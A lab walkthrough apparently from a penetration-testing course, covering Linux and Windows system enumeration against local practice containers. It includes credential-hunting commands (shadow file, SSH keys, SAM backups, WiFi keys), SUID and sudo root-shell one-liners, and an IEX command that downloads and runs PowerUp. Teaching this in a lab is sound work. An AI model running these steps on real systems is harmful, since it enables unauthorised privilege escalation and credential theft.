# System Enumeration Walkthrough

Step-by-step guide for enumerating Linux and Windows systems.

---

## Lab 1: Linux System Enumeration

**Target:** CyberLab Docker containers

### Step 1: Connect to Target

```bash
# Option A: Access via vulnerable SSH
ssh -p 2222 labuser@localhost
# Password: labpass123

# Option B: Execute directly in container
docker exec -it lab-buffer-overflow /bin/bash
```

### Step 2: Initial Reconnaissance

```bash
# First, establish who and where you are
echo "=== USER INFO ==="
id
whoami
hostname

echo "=== SYSTEM INFO ==="
uname -a
cat /etc/*release* 2>/dev/null | head -5
```

**Expected Output Analysis:**
- Note your UID/GID - are you root (0) or low-privilege user?
- Check the kernel version for known vulnerabilities
- Note the distribution for appropriate tools/exploits

### Step 3: Enumerate Other Users

```bash
# List all users with shell access
echo "=== USERS WITH SHELLS ==="
grep -E '/bin/(ba)?sh' /etc/passwd

# Check for interesting users
echo "=== ALL USERS ==="
cat /etc/passwd | cut -d: -f1,3,4 | column -t -s:

# Check if shadow is readable (indicates poor security)
cat /etc/shadow 2>/dev/null && echo "SHADOW READABLE!"

# Check sudo permissions
sudo -l 2>/dev/null
```

### Step 4: SUID Binary Discovery

SUID binaries run with owner privileges - critical for privilege escalation.

```bash
# Find all SUID binaries
echo "=== SUID BINARIES ==="
find / -perm -4000 -type f 2>/dev/null

# More detailed view
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null

# Compare against GTFOBins known exploitable binaries
# Common exploitable: find, vim, python, perl, nmap, less, more, nano
```

**Check each SUID binary against GTFOBins:**
```bash
# Example: If you find /usr/bin/find with SUID
# GTFOBins says:
find . -exec /bin/sh -p \; -quit
```

### Step 5: Check Sudo Configuration

```bash
# What can current user run with sudo?
sudo -l

# Example output:
# User labuser may run the following commands:
#     (ALL) NOPASSWD: /usr/bin/vim
#
# This means vim can be exploited for root shell!
```

**Exploiting sudo vim:**
```bash
sudo vim -c ':!/bin/bash'
```

### Step 6: Network Enumeration

```bash
echo "=== NETWORK INTERFACES ==="
ip addr 2>/dev/null || ifconfig

echo "=== LISTENING PORTS ==="
ss -tulpn 2>/dev/null || netstat -tulpn

echo "=== CONNECTIONS ==="
ss -an 2>/dev/null | grep ESTABLISHED

echo "=== ROUTING TABLE ==="
ip route 2>/dev/null || route -n

echo "=== OTHER HOSTS (ARP) ==="
ip neigh 2>/dev/null || arp -a
```

**What to look for:**
- Services running on localhost only (127.0.0.1)
- Connections to other internal hosts
- Open ports that might be internally accessible services

### Step 7: Process and Service Enumeration

```bash
echo "=== PROCESSES RUNNING AS ROOT ==="
ps aux | grep "^root"

echo "=== INTERESTING PROCESSES ==="
ps aux | grep -E "(mysql|postgres|apache|nginx|docker|screen|tmux)"

echo "=== CRON JOBS ==="
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/

# Check for writable cron scripts
find /etc/cron* -type f -perm -o+w 2>/dev/null
```

### Step 8: Interesting Files Search

```bash
# SSH keys
echo "=== SSH KEYS ==="
find / -name "id_rsa" -o -name "id_dsa" -o -name "*.pem" 2>/dev/null
ls -la ~/.ssh/ 2>/dev/null

# Configuration files with credentials
echo "=== POSSIBLE CREDENTIALS ==="
grep -r "password" /etc/*.conf 2>/dev/null
find / -name "*.conf" -exec grep -l -i "pass\|pwd\|secret" {} \; 2>/dev/null | head -20

# History files
echo "=== BASH HISTORY ==="
cat ~/.bash_history 2>/dev/null | grep -E "(pass|secret|key|token)"

# Backup files
echo "=== BACKUP FILES ==="
find / -name "*.bak" -o -name "*.backup" -o -name "*.old" -o -name "*~" 2>/dev/null
```

### Step 9: Automated Enumeration

```bash
# Download LinPEAS
curl -L -o linpeas.sh https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh

# Run with all checks
./linpeas.sh -a 2>&1 | tee linpeas_output.txt

# Review color-coded output:
# RED/YELLOW = High priority findings
# GREEN = Potentially useful info
```

### Step 10: Create Summary Report

```bash
# Quick enumeration script
cat << 'EOF' > quick_enum.sh
#!/bin/bash
echo "========== QUICK ENUMERATION =========="
echo "Date: $(date)"
echo "Host: $(hostname)"
echo "User: $(whoami) ($(id))"
echo ""
echo "=== OS INFO ==="
uname -a
cat /etc/os-release 2>/dev/null | grep PRETTY_NAME
echo ""
echo "=== SUDO PRIVILEGES ==="
sudo -l 2>/dev/null || echo "Cannot check sudo"
echo ""
echo "=== SUID BINARIES ==="
find / -perm -4000 -type f 2>/dev/null | head -20
echo ""
echo "=== LISTENING SERVICES ==="
ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null
echo ""
echo "=== WRITABLE PATHS ==="
find / -writable -type d 2>/dev/null | grep -v "^/proc\|^/dev\|^/run" | head -20
echo ""
echo "========== END ENUMERATION =========="
EOF
chmod +x quick_enum.sh
./quick_enum.sh
```

---

## Lab 2: Windows System Enumeration

**Target:** Windows VM or Metasploitable3

### Step 1: Initial Reconnaissance

```powershell
# Basic system information
Write-Host "=== SYSTEM INFO ==="
systeminfo | Select-String -Pattern "OS Name|OS Version|System Type|Hotfix"

Write-Host "=== USER INFO ==="
whoami /all
```

### Step 2: User and Privilege Enumeration

```powershell
# Current user privileges
Write-Host "=== CURRENT PRIVILEGES ==="
whoami /priv

# Local users
Write-Host "=== LOCAL USERS ==="
net user
Get-LocalUser

# Administrators
Write-Host "=== ADMINISTRATORS ==="
net localgroup administrators

# Domain info (if joined)
Write-Host "=== DOMAIN INFO ==="
systeminfo | findstr Domain
```

### Step 3: Network Enumeration

```powershell
# Network configuration
Write-Host "=== NETWORK CONFIG ==="
ipconfig /all

# Open ports
Write-Host "=== LISTENING PORTS ==="
netstat -ano | findstr LISTENING

# Established connections
Write-Host "=== CONNECTIONS ==="
netstat -ano | findstr ESTABLISHED

# Firewall status
Write-Host "=== FIREWALL ==="
netsh advfirewall show allprofiles state
```

### Step 4: Service Enumeration

```powershell
# All services
Write-Host "=== RUNNING SERVICES ==="
Get-Service | Where-Object {$_.Status -eq "Running"}

# Services with unquoted paths
Write-Host "=== UNQUOTED SERVICE PATHS ==="
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """"

# Service permissions (requires accesschk from Sysinternals)
# accesschk.exe -uwcqv "Everyone" * /accepteula
```

### Step 5: Scheduled Tasks

```powershell
# List scheduled tasks
Write-Host "=== SCHEDULED TASKS ==="
schtasks /query /fo LIST | findstr /i "TaskName\|Task To Run"

# Detailed view
Get-ScheduledTask | Where-Object {$_.State -eq "Ready"} | Format-Table TaskName,TaskPath,State
```

### Step 6: Installed Software

```powershell
# Installed programs
Write-Host "=== INSTALLED SOFTWARE ==="
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion | Sort-Object DisplayName

# Check for vulnerable software
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion | Where-Object {$_.DisplayName -like "*Java*" -or $_.DisplayName -like "*Adobe*" -or $_.DisplayName -like "*Office*"}
```

### Step 7: Privilege Escalation Checks

```powershell
# AlwaysInstallElevated
Write-Host "=== ALWAYS INSTALL ELEVATED ==="
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>$null
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>$null

# Stored credentials
Write-Host "=== STORED CREDENTIALS ==="
cmdkey /list

# Saved WiFi passwords
netsh wlan show profiles
# netsh wlan show profile name="ProfileName" key=clear

# SAM/SYSTEM backups
Write-Host "=== SAM BACKUPS ==="
dir /s /b C:\Windows\repair\SAM 2>$null
dir /s /b C:\Windows\System32\config\RegBack\SAM 2>$null
```

### Step 8: Interesting Files

```powershell
# Search for password files
Write-Host "=== PASSWORD SEARCHES ==="
findstr /si password *.txt *.ini *.config *.xml 2>$null | Select-Object -First 20

# Unattend files
Write-Host "=== UNATTEND FILES ==="
dir /s /b C:\*unattend*.xml C:\*sysprep*.xml C:\*sysprep*.inf 2>$null

# PowerShell history
Write-Host "=== PS HISTORY ==="
$histPath = (Get-PSReadlineOption).HistorySavePath
if (Test-Path $histPath) { Get-Content $histPath | Select-Object -Last 50 }

# IIS configs
Write-Host "=== IIS CONFIG ==="
type C:\inetpub\wwwroot\web.config 2>$null
```

### Step 9: Automated Enumeration

```powershell
# WinPEAS
Invoke-WebRequest -Uri "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe" -OutFile winpeas.exe
.\winpeas.exe > winpeas_output.txt

# PowerUp
IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')
Invoke-AllChecks

# Seatbelt
.\Seatbelt.exe -group=all > seatbelt_output.txt
```

### Step 10: Summary Script

```powershell
# Windows quick enumeration script
$output = @"
========== WINDOWS ENUMERATION ==========
Date: $(Get-Date)
Host: $env:COMPUTERNAME
User: $env:USERNAME
Domain: $env:USERDOMAIN

=== PRIVILEGES ===
$(whoami /priv | Out-String)

=== LOCAL ADMINS ===
$(net localgroup administrators | Out-String)

=== LISTENING PORTS ===
$(netstat -ano | findstr LISTENING | Out-String)

=== SCHEDULED TASKS ===
$(schtasks /query /fo LIST | findstr "TaskName" | Out-String)

========== END ENUMERATION ==========
"@

$output | Out-File -FilePath "enum_results.txt"
Write-Host $output
```

---

## Practice Exercises

### Exercise 1: Container Enumeration Challenge

Connect to the buffer overflow container and answer these questions:

1. What user are you running as?
2. What files exist in /app?
3. Are there any SUID binaries?
4. What processes are running?
5. What network connections exist?

```bash
docker exec -it lab-buffer-overflow /bin/bash
# Perform enumeration and document findings
```

### Exercise 2: Find the Hidden Credentials

```bash
# Connect to vulnerable SSH
ssh -p 2222 labuser@localhost

# Find:
# 1. Any password in configuration files
# 2. SSH keys that could be used for lateral movement
# 3. Database credentials
# 4. Readable shadow file
```

### Exercise 3: Automated vs Manual Comparison

```bash
# Run manual enumeration and save output
./quick_enum.sh > manual_output.txt

# Run LinPEAS
./linpeas.sh > linpeas_output.txt

# Compare: What did LinPEAS find that manual missed?
# Compare: What did manual find faster?
```

---

## Key Takeaways

1. **Always start with basics** - `id`, `whoami`, `uname -a`
2. **Document everything** - Save output to files for later reference
3. **Check sudo and SUID first** - Often the quickest privesc path
4. **Network enum reveals pivot opportunities** - Look for internal services
5. **Automated tools complement, not replace, manual enumeration**
6. **Be thorough but prioritize** - Focus on likely privesc vectors

---

**Next:** [Hints](./hints.md) | **Continue to:** [02 - Shell Techniques](../02-shells/)
